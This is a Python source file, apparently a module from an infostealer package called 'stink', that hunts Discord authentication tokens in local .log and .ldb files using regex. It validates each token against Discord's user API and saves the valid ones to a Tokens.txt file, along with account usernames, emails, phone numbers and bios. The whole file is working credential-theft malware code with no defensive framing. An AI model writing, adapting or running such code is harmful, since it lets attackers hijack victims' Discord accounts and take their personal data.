from re import findall
from json import loads
from threading import Thread
from typing import MutableMapping
from os import listdir, path, makedirs
from urllib.request import Request, urlopen

from stink.helpers.config import DiscordConfig


class Discord:
    """
    Collects tokens from the Discord.
    """
    def __init__(self, storage_path: str, folder: str):

        self.__storage_path = storage_path
        self.__folder = folder

        self.__config = DiscordConfig()

    def __create_folder(self) -> None:
        """
        Creates storage for the Discord module.
        :return: None
        """
        folder = rf"{self.__storage_path}\{self.__folder}"

        if not path.exists(folder):
            makedirs(folder)

    def __get_headers(self, token: str = None, content_type: str = "application/json") -> dict:
        """
        Composes the headers for the query.
        :param token: str
        :param content_type: str
        :return: dict
        """
        headers = {
            "Content-Type": content_type,
            "User-Agent": self.__config.UserAgent
        }

        if token is not None:
            headers.update({"Authorization": token})

        return headers

    def __check_token(self, *args: MutableMapping[str, str]) -> None:
        """
        Checks token for validity.
        :param args: [str, dict]
        :return: None
        """
        try:
            query = urlopen(Request(method="GET", url="https://discordapp.com/api/v6/users/@me", headers=args[1]))
            self.valid.append((args[0], query))
        except:
            self.invalid.append(args[0])

    def __get_tokens(self) -> None:
        """
        Collects all valid and invalid Discord tokens.
        :return: None
        """
        if not path.exists(self.__config.TokensPath):
            return

        tokens = []

        self.valid = []
        self.invalid = []

        for file in listdir(self.__config.TokensPath):

            if file[-4:] not in [".log", ".ldb"]:
                continue

            for data in [line.strip() for line in open(rf"{self.__config.TokensPath}\{file}", "r", errors="ignore", encoding="utf-8").readlines()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                    [tokens.append(item) for item in findall(regex, data)]

        if not tokens:
            return

        self.__create_folder()

        tasks = []

        for token in tokens:
            task = Thread(target=self.__check_token, args=[token, self.__get_headers(token)])
            task.setDaemon(True)
            task.start()
            tasks.append(task)

        for task in tasks:
            task.join()

        temp = []

        for result in self.valid:
            storage = loads(result[1].read().decode("utf-8"))
            data = self.__config.DiscordData

            temp.append(data.format(
                storage["username"] if storage["username"] else "No data",
                storage["email"] if storage["email"] else "No data",
                storage["phone"] if storage["phone"] else "No data",
                storage["bio"] if storage["bio"] else "No data",
                result[0]
            ))

        with open(rf"{self.__storage_path}\{self.__folder}\Tokens.txt", "a", encoding="utf-8") as discord:

            discord.write("Invalid tokens:\n" + "\n".join(item for item in self.invalid) + "\n\nValid tokens:\n")
            discord.write("".join(item for item in temp))

        discord.close()

    def run(self) -> None:
        """
        Launches the Discord tokens collection module.
        :return: None
        """
        try:

            self.__get_tokens()

        except Exception as e:
            print(f"[Discord]: {repr(e)}")
